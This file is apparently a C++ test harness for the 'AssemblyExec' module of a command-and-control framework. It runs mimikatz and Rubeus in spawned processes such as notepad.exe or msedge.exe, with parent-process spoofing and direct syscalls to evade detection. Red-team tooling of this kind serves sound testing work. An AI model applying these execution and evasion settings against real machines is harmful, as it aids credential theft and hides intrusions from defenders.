#include "../AssemblyExec.hpp"

#ifdef __linux__
#elif _WIN32
#include <windows.h>
#endif

bool testAssemblyExec();

int main()
{
    bool res;
    
    std::cout << "[+] testAssemblyExec" << std::endl;
    res = testAssemblyExec();
    if (res)
     std::cout << "[+] Sucess" << std::endl;
    else
     std::cout << "[-] Failed" << std::endl;

    return 0;
}


bool fileExists(const std::string& path) 
{
    std::ifstream file(path);
    return file.good();
}

bool testAssemblyExec()
{
    std::unique_ptr<AssemblyExec> assemblyExec = std::make_unique<AssemblyExec>();

    if (fileExists(".\\Rubeus.exe")) {
    } else {
        std::cout << ".\\Rubeus.exe File does not exist." << std::endl;
        return false;
    }
    if (fileExists(".\\mimikatz.exe")) {
    } else {
        std::cout << ".\\mimikatz.exe File does not exist." << std::endl;
        return false;
    }

    {
#ifdef __linux__
#elif _WIN32
        std::cout << "Test long output" << std::endl;

        std::vector<std::string> splitedCmd;
        splitedCmd.push_back("assemblyExec");
        splitedCmd.push_back("-e");
        splitedCmd.push_back(".\\testOutputWriter.exe");

        C2Message c2Message;
        C2Message c2RetMessage;

        assemblyExec->init(splitedCmd, c2Message);
        assemblyExec->process(c2Message, c2RetMessage);

        std::string output = "\n\noutput:\n";
        output += c2RetMessage.returnvalue();
        output += "\n";
        // std::cout << output << std::endl;
        std::cout << output.size() << std::endl;

        if(output.size()<10*400+4000*2*2)
            return false;
#endif
    }
    {
#ifdef __linux__
#elif _WIN32
        std::cout << "Test long output SpoofedParent" << std::endl;

        std::vector<std::string> splitedCmd;
        splitedCmd.push_back("assemblyExec");
        splitedCmd.push_back("-e");
        splitedCmd.push_back(".\\testOutputWriter.exe");

        C2Message c2Message;
        C2Message c2RetMessage;
        assemblyExec->setModeSpoofParent(true);
        assemblyExec->setSpoofedParent("explorer.exe");

        assemblyExec->init(splitedCmd, c2Message);
        assemblyExec->process(c2Message, c2RetMessage);

        std::string output = "\n\noutput:\n";
        output += c2RetMessage.returnvalue();
        output += "\n";
        // std::cout << output << std::endl;
        std::cout << output.size() << std::endl;

        if(output.size()<10*400+4000*2*2)
            return false;
#endif
    }
    {
#ifdef __linux__
#elif _WIN32
        std::cout << "Syscall true - setModeProcess true - ModeSpoofParent true - SpoofedParent explorer.exe" << std::endl;

        std::vector<std::string> splitedCmd;
        splitedCmd.push_back("assemblyExec");
        splitedCmd.push_back("-e");
        splitedCmd.push_back(".\\mimikatz.exe");
        splitedCmd.push_back("\"sleep 1000\""); 
        splitedCmd.push_back("\"exit\"");
        
        C2Message c2Message;
        C2Message c2RetMessage;
        assemblyExec->setProcessToSpawn("notepad.exe");
        assemblyExec->setUseSyscall(true);
        assemblyExec->setModeProcess(true);
        assemblyExec->setModeSpoofParent(true);
        assemblyExec->setSpoofedParent("explorer.exe");

        assemblyExec->init(splitedCmd, c2Message);
        assemblyExec->process(c2Message, c2RetMessage);

        std::string output = "\n\noutput:\n";
        output += c2RetMessage.returnvalue();
        output += "\n";
        std::cout << output << std::endl;
        std::cout << output.size() << std::endl;

        if(output.size()<40)
            return false;
#endif
    }
    {
#ifdef __linux__
#elif _WIN32
        std::cout << "Syscall true - setModeProcess true - ModeSpoofParent false - SpoofedParent" << std::endl;

        std::vector<std::string> splitedCmd;
        splitedCmd.push_back("assemblyExec");
        splitedCmd.push_back("-e");
        splitedCmd.push_back(".\\mimikatz.exe");
        splitedCmd.push_back("\"sleep 1000\""); 
        splitedCmd.push_back("\"exit\"");

        C2Message c2Message;
        C2Message c2RetMessage;

        assemblyExec->setProcessToSpawn("notepad.exe");
        assemblyExec->setUseSyscall(true);
        assemblyExec->setModeProcess(true);
        assemblyExec->setModeSpoofParent(false);
        assemblyExec->setSpoofedParent("");

        assemblyExec->init(splitedCmd, c2Message);
        assemblyExec->process(c2Message, c2RetMessage);

        std::string output = "\n\noutput:\n";
        output += c2RetMessage.returnvalue();
        output += "\n";
        std::cout << output << std::endl;
        std::cout << output.size() << std::endl;

        if(output.size()<40)
            return false;
#endif
    }
    {
#ifdef __linux__
#elif _WIN32
        std::cout << "Syscall true - setModeProcess false - ModeSpoofParent false - SpoofedParent" << std::endl;

        std::vector<std::string> splitedCmd;
        splitedCmd.push_back("assemblyExec");
        splitedCmd.push_back("-e");
        splitedCmd.push_back(".\\Rubeus.exe");
        splitedCmd.push_back("triage");

        C2Message c2Message;
        C2Message c2RetMessage;

        assemblyExec->setProcessToSpawn("notepad.exe");
        assemblyExec->setUseSyscall(false);
        assemblyExec->setModeProcess(false);

        assemblyExec->init(splitedCmd, c2Message);
        assemblyExec->process(c2Message, c2RetMessage);

        std::string output = "\n\noutput:\n";
        output += c2RetMessage.returnvalue();
        output += "\n";
        std::cout << output << std::endl;
        std::cout << output.size() << std::endl;

        if(output.size()<40)
            return false;
#endif
    }
    {
#ifdef __linux__
#elif _WIN32
        std::cout << "Syscall true - setModeProcess false - ModeSpoofParent true - SpoofedParent explorer.exe" << std::endl;

        std::vector<std::string> splitedCmd;
        splitedCmd.push_back("assemblyExec");
        splitedCmd.push_back("-e");
        splitedCmd.push_back(".\\mimikatz.exe");
        splitedCmd.push_back("\"sleep 10000\""); 
        splitedCmd.push_back("\"exit\"");

        C2Message c2Message;
        C2Message c2RetMessage;
        assemblyExec->setProcessToSpawn("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe");
        assemblyExec->setUseSyscall(false);
        assemblyExec->setModeProcess(true);
        assemblyExec->setModeSpoofParent(true);
        assemblyExec->setSpoofedParent("msedge.exe");
        
        assemblyExec->init(splitedCmd, c2Message);
        assemblyExec->process(c2Message, c2RetMessage);

        std::string output = "\n\noutput:\n";
        output += c2RetMessage.returnvalue();
        output += "\n";
        std::cout << output << std::endl;
        std::cout << output.size() << std::endl;

        if(output.size()<40)
            return false;
#endif
    }
//     {
// #ifdef __linux__

// #elif _WIN32
//         std::vector<std::string> splitedCmd;
//         splitedCmd.push_back("assemblyExec");
//         splitedCmd.push_back("-e");
//         splitedCmd.push_back(".\\mimikatz.exe");
//         splitedCmd.push_back("\"sleep 1000000\""); 
//         splitedCmd.push_back("\"exit\"");


//         C2Message c2Message;
//         C2Message c2RetMessage;
//         assemblyExec->init(splitedCmd, c2Message);
//         assemblyExec->process(c2Message, c2RetMessage);

//         std::string output = "\n\noutput:\n";
//         output += c2RetMessage.returnvalue();
//         output += "\n";
//         std::cout << output << std::endl;
// #endif

//     }

    return true;
}
